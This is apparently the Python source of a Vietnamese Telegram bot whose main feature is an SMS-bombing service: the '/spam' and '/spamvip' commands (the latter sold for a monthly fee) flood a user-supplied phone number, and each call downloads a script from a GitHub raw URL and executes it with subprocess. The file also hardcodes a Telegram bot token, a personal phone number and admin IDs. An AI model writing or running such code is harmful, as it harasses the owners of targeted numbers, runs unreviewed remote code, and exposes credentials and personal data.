import telebot
import subprocess
import sys
from requests import post, Session
import time
import datetime
from urllib.parse import urlparse
import psutil
import tempfile
import random
import string
import os
import requests
import sqlite3
from telebot import types
from time import strftime

admin_diggory = "Trumdayhahaha" # ví dụ : để user name admin là @diggory347 bỏ dấu @ đi là đc
name_bot = "vLong zZ"
zalo = "0789041631"
web = "https://dichvukey.site/"
facebook = "no"
allowed_group_id = -1002201340697
bot=telebot.TeleBot("7298886741:AAGGmigJ82QwjdfnXXzgDnJjszWxUAMWtvE") 
print("Bot đã được khởi động thành công")
users_keys = {}
key = ""
auto_spam_active = False
last_sms_time = {}
allowed_users = []
processes = []
ADMIN_ID =  6435141966
connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()
last_command_time = {}


def check_command_cooldown(user_id, command, cooldown):
    current_time = time.time()
    
    if user_id in last_command_time and current_time - last_command_time[user_id].get(command, 0) < cooldown:
        remaining_time = int(cooldown - (current_time - last_command_time[user_id].get(command, 0)))
        return remaining_time
    else:
        last_command_time.setdefault(user_id, {})[command] = current_time
        return None

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
  now = str(datetime.date.today())
  return now


def load_users_from_database():
  cursor.execute('SELECT user_id, expiration_time FROM users')
  rows = cursor.fetchall()
  for row in rows:
    user_id = row[0]
    expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
    if expiration_time > datetime.datetime.now():
      allowed_users.append(user_id)


def save_user_to_database(connection, user_id, expiration_time):
  cursor = connection.cursor()
  cursor.execute(
    '''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
  connection.commit()
###



###
####
start_time = time.time()

@bot.message_handler(commands=['time'])
def handle_time(message):
    uptime_seconds = int(time.time() - start_time)
    
    uptime_minutes, uptime_seconds = divmod(uptime_seconds, 60)
    bot.reply_to(message, f'Bot đã hoạt động được: {uptime_minutes} phút, {uptime_seconds} giây')
#tiktok
def fetch_tiktok_data(url):
    api_url = f'https://scaninfo.vn/api/down/tiktok.php?url={url}'
    try:
        response = requests.get(api_url)
        response.raise_for_status()  
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print(f"Error fetching TikTok data: {e}")
        return None

@bot.message_handler(commands=['tiktok'])
def tiktok_command(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) == 2:
        url = command_parts[1].strip()
        data = fetch_tiktok_data(url)
        
        if data and 'code' in data and data['code'] == 0:
            video_title = data['data'].get('title', 'N/A')
            video_url = data['data'].get('play', 'N/A')
            music_title = data['data']['music_info'].get('title', 'N/A')
            music_url = data['data']['music_info'].get('play', 'N/A')
            
            reply_message = f"Tiêu đề Video: {video_title}\nĐường dẫn Video: {video_url}\n\nTiêu đề Nhạc: {music_title}\nĐường dẫn Nhạc: {music_url}"
            bot.reply_to(message, reply_message)
        else:
            bot.reply_to(message, "Không thể lấy dữ liệu từ TikTok.")
    else:
        bot.reply_to(message, "Hãy cung cấp một đường dẫn TikTok hợp lệ.")


@bot.message_handler(commands=['tool'])
def send_tool_links(message):
    tool_links = [
        ("https://www.mediafire.com/file/ypkld87i2x2ynpq/gopvip.py/file", "Link Tải Tool gộp vip nhiều chế độ"),
        ("https://www.mediafire.com/file/00crrtkxut8oa7s/goliketiktokauto.py/file", "Link Tải Tool Golike Tiktok Auto Làm Nhiệm Vụ"),
        ("https://dichvukey.site", "Link Tải Tool Gộp - Source Tool Gộp")
    ]
    
    message_text = "\n".join([f"{desc}: {link}" for link, desc in tool_links])
    
    bot.reply_to(message, message_text)
####
#####
video_url = 'https://v16m-default.akamaized.net/b7650db4ac7f717b7be6bd6a04777a0d/66a418a5/video/tos/useast2a/tos-useast2a-ve-0068-euttp/o4QTIgGIrNbkAPGKKLKteXyLedLE7IEgeSzeE2/?a=0&bti=OTg7QGo5QHM6OjZALTAzYCMvcCMxNDNg&ch=0&cr=0&dr=0&lr=all&cd=0%7C0%7C0%7C0&cv=1&br=2576&bt=1288&cs=0&ds=6&ft=XE5bCqT0majPD12cy-773wUOx5EcMeF~O5&mime_type=video_mp4&qs=0&rc=Mzk1OzY7PGdpZjxkOTQ3M0Bpajh1O2w5cmlzbzMzZjgzM0AuNWJgLi02NjMxLzBgXjUyYSNzNmptMmRjazFgLS1kL2Nzcw%3D%3D&vvpl=1&l=202407261543513F37EAD38E23B6263167&btag=e00088000'

@bot.message_handler(commands=['add', 'adduser'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'BẠN KHÔNG CÓ QUYỀN SỬ DỤNG LỆNH NÀY')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'VUI LÒNG NHẬP ID NGƯỜI DÙNG')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    # Gửi video với tiêu đề
    caption_text = (f'NGƯỜI DÙNG CÓ ID {user_id}                                ĐÃ ĐƯỢC THÊM VÀO DANH SÁCH ĐƯỢC PHÉP SỬ DỤNG LỆNH /spamvip')
    bot.send_video(
        message.chat.id,
        video_url,
        caption=caption_text
    )

load_users_from_database()






def is_key_approved(chat_id, key):
    if chat_id in users_keys:
        user_key, timestamp = users_keys[chat_id]
        if user_key == key:
            current_time = datetime.datetime.now()
            if current_time - timestamp <= datetime.timedelta(hours=2):
                return True
            else:
                del users_keys[chat_id]
    return False

@bot.message_handler(commands=['vlong'])
def send_welcome(message):
   
   
    username = message.from_user.username
    bot.reply_to(message, f'''
┌───⭓ {name_bot}
│» Xin chào @{username}
│» /vlong : Lệnh trợ giúp
│» /admin : Thông tin admin
│» /spam : Spam SMS FREE
│» /spamvip : Spam SMS VIP - Mua Vip 30k/Tháng
│» info : Kiểm Tra Thông Tin fb bỏ /
│» /yt : Kiểm Tra Thông Tin VD YOUTUBE .
│» /video : Để Xem Video Chill.
│» /id : Lấy ID Tele Của Bản Thân
│» /voice : Đổi Văn Bản Thành Giọng Nói.
│» get : Check Thông Tin Nick Free Fire.
│» /tiktok : Check Thông Tin - Tải Video Tiktok.
│» /tool : Tải tool gộp - Golike Auto - source gộp
│» /time : check thời gian hoạt động
│» /ad : có bao nhiêu admin
│» /code : Lấy Code html của web
│» /tv : Đổi Ngôn Ngữ Sang Tiếng Việt
│» Lệnh Cho ADMIN
│» /rs : Khởi Động Lại
│» /add : Thêm người dùng sử dụng /spamvip
└───────────⧕
    ''')
@bot.message_handler(commands=['admin'])
def diggory(message):
     
    username = message.from_user.username
    diggory_chat = f'''
┌───⭓ {name_bot}
│» Xin chào @{username}
│» Bot Spam : vLongzZ x Mạnh Offcal
│» Zalo: {zalo}
│» Website: {web}
│» Telegram: @{admin_diggory}
└──────────────
    '''
    bot.send_message(message.chat.id, diggory_chat)


last_usage = {}

@bot.message_handler(commands=['spam'])
def spam(message):
    user_id = message.from_user.id
    
    current_time = time.time()
    if user_id in last_usage and current_time - last_usage[user_id] < 100:
        bot.reply_to(message, f"Vui lòng đợi {100 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
        return
    
    last_usage[user_id] = current_time

    params = message.text.split()[1:]

    if len(params) < 2:
        bot.reply_to(message, "/spam 113 5 như này cơ mà - vì lý sever treo bot hơi cùi nên đợi 100giây nữa dùng lại nhé")
        return

    sdt = params[0]
    count = params[1]

    if not count.isdigit():
        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng chỉ nhập số.")
        return
    
    count = int(count)
    
    if count > 5:
        bot.reply_to(message, "/spam sdt 5 thôi nhé - đợi 100giây sử dụng lại.")
        return

    if sdt in blacklist:
        bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
        return

    diggory_chat3 = f'''
┌──────⭓ {name_bot}
│ Spam: Thành Công 
│ Số Lần Spam Free: {count}
│ Đang Tấn Công : {sdt}
│ Spam 5 Lần Tầm 1-2p mới xong 
│ Hạn Chế Spam Nhé !  
└─────────────
    '''

    script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
    try:
        response = requests.get(script_url)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name
            process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
            bot.send_message(message.chat.id, diggory_chat3)
        else:
            bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đê")
    except Exception as e:
        bot.reply_to(message, f"Lỗi Tí Rồi Chạy Lại Đê")

blacklist = ["0789041631", "112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "5"]

@bot.message_handler(commands=['spamvip'])
def supersms(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, 'Hãy Mua Vip Để Sử Dụng.')
        return
    
    current_time = time.time()
    if user_id in last_usage and current_time - last_usage[user_id] < 250:
        bot.reply_to(message, f"Vui lòng đợi {250 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
        return
    
    last_usage[user_id] = current_time

    params = message.text.split()[1:]

    if len(params) < 2:
        bot.reply_to(message, "/spamvip 113 5 như này cơ mà - vì lý sever treo bot hơi cùi nên đợi 250giây nữa dùng lại nhé")
        return

    sdt = params[0]
    count = params[1]

    if not count.isdigit():
        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng nhập một số nguyên dương.")
        return
    
    count = int(count)
    
    if count > 30:
        bot.reply_to(message, "/spamvip sdt 30 thôi nhé - đợi 250giây sử dụng lại.")
        return

    if sdt in blacklist:
        bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
        return

    diggory_chat3 = f'''
┌──────⭓ {name_bot}
│ Spam: Thành Công 
│ Số Lần Spam Vip: {count}
│ Đang Tấn Công : {sdt}
│ Spam 30 Lần Tầm 5-10p mới xong 
│ Hạn Chế Spam Nhé !  
└─────────────
    '''

    script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
    try:
        response = requests.get(script_url)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name
            process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
            bot.send_message(message.chat.id, diggory_chat3)
        else:
            bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đi")
    except Exception as e:
        bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đi")






API_URL = "https://scaninfo.vn/api/gg/voice.php?text={}"
@bot.message_handler(commands=['voice'])
def handle_voice_command(message):
    try:
        text = message.text.split('/voice ', 1)[1].strip()
        api_request_url = API_URL.format(requests.utils.quote(text))
        response = requests.get(api_request_url)
        if response.status_code == 200:
            audio_data = response.content
            if audio_data:
                bot.send_voice(message.chat.id, audio_data, reply_to_message_id=message.message_id)
            else:
                bot.reply_to(message, f"@{message.from_user.username} Không thể tạo giọng nói từ văn bản này.")
        else:
            bot.reply_to(message, f"@{message.from_user.username} Đã xảy ra lỗi khi chuyển đổi văn bản thành giọng nói.")
    except IndexError:
        bot.reply_to(message, f"@{message.from_user.username} Vui lòng nhập văn bản sau lệnh /voice.")
    
    except Exception as e:
        bot.reply_to(message, f"@{message.from_user.username} Lỗi không xác định: {str(e)}")
ADMIN_NAME = "vLong zZ"
ADMIN_NAME1 = "Mạnh Offical"

@bot.message_handler(commands=['ad'])
def send_admin_info(message):
    bot.send_message(
        message.chat.id, 
        f"Tất Nhiên Là Có 2 AD Đó Là : {ADMIN_NAME} Và {ADMIN_NAME1}\nID: `{ADMIN_ID}`", 
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text.isdigit())
def copy_user_id(message):
    bot.send_message(message.chat.id, f"ID của bạn đã được sao chép: `{message.text}`", parse_mode='Markdown')
ADMIN_NAME = "vLong zZ"
@bot.message_handler(commands=['id'])
def get_user_id(message):
    if len(message.text.split()) == 1:  
        user_id = message.from_user.id
        bot.reply_to(message, f"ID của bạn là: `{user_id}`", parse_mode='Markdown')
    else:  
        username = message.text.split('@')[-1].strip()
        try:
            user = bot.get_chat(username)  # Lấy thông tin người dùng từ username
            bot.reply_to(message, f"ID của {user.first_name} là: `{user.id}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, "Không tìm thấy người dùng có username này.")
@bot.message_handler(commands=['ID'])
def handle_id_command(message):
    chat_id = message.chat.id
    bot.reply_to(message, f"ID của nhóm này là: {chat_id}")
####################
import time

def restart_program():
    """Khởi động lại script chính và môi trường chạy."""
    python = sys.executable
    script = sys.argv[0]
    # Khởi động lại script chính từ đầu
    try:
        subprocess.Popen([python, script])
    except Exception as e:
        print(f"Khởi động lại không thành công: {e}")
    finally:
        time.sleep(10)  # Đợi một chút để đảm bảo instance cũ đã ngừng hoàn toàn
        sys.exit()

@bot.message_handler(commands=['rs'])
def handle_reset(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "Bot đang khởi động lại...")
        restart_program()
    else:
        bot.reply_to(message, "Bạn không có quyền truy cập vào lệnh này!")
####
@bot.message_handler(commands=['tv'])
def handle_tv(message):
    # Gửi liên kết để thay đổi ngôn ngữ giao diện với định dạng HTML
    bot.reply_to(message, 'Nhấp <a href="https://t.me/setlanguage/abcxyz">Vào Đây</a> Để Đổi Ngôn Ngữ Sang Tiếng Việt', parse_mode='HTML')
############





@bot.message_handler(commands=['code'])
def handle_code_command(message):
    # Tách lệnh và URL từ tin nhắn
    command_args = message.text.split(maxsplit=1)

    # Kiểm tra xem URL có được cung cấp không
    if len(command_args) < 2:
        bot.reply_to(message, "Vui lòng cung cấp url sau lệnh /code. Ví dụ: /code https://vlongzZ.com")
        return

    url = command_args[1]
    domain = urlparse(url).netloc
    file_name = f"{domain}.txt"
    
    try:
        # Lấy nội dung HTML từ URL
        response = requests.get(url)
        response.raise_for_status()  # Xảy ra lỗi nếu có lỗi HTTP

        # Lưu nội dung HTML vào file
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(response.text)

        # Gửi file về người dùng
        with open(file_name, 'rb') as file:
            bot.send_document(message.chat.id, file, caption=f"HTML của trang web {url}")

        # Phản hồi tin nhắn gốc
        bot.reply_to(message, "Đã gửi mã nguồn HTML của trang web cho bạn.")

    except requests.RequestException as e:
        bot.reply_to(message, f"Đã xảy ra lỗi khi tải trang web: {e}")

    finally:
        # Đảm bảo xóa file sau khi gửi
        if os.path.exists(file_name):
            try:
                os.remove(file_name)
            except Exception as e:
                bot.reply_to(message, f"Đã xảy ra lỗi khi xóa file: {e}")




bot.polling()
